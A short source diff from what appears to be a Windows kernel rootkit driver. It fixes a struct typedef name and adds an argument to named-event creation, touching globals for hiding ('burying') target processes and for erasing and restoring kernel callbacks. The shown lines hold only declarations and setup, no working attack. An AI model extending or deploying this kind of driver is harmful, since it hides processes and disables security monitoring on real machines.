@@ -48,7 +48,7 @@ typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
     LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
     CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
     INT length;
-} KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY;
+} KERNEL_CALLBACK_RESTORE_INFO_ARRAY;
 
 typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
@@ -64,7 +64,7 @@ typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_R
 namespace BeGlobals
 {
     WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
-    KERNEL_CALLBACK_RESTORE_INFO_ARRAY_ARRAY beCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };
+    KERNEL_CALLBACK_RESTORE_INFO_ARRAY beCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };
 
     // Mutexes
     FastMutex processListLock = FastMutex();
@@ -155,8 +155,8 @@ namespace BeGlobals
         // Setup shared memory for interprocess communications
         UNICODE_STRING commandEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeCommandEvent");
         UNICODE_STRING answerEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeAnswerEvent");
-        BeCreateNamedEvent(&commandEvent, &commandEventName);
-        BeCreateNamedEvent(&answerEvent, &answerEventName);
+        BeCreateNamedEvent(&commandEvent, &commandEventName, FALSE);
+        BeCreateNamedEvent(&answerEvent, &answerEventName, FALSE);
         LOG_MSG("Created events\n");
 
         BeCreateSharedMemory(&hSharedMemory, &pSharedMemory);
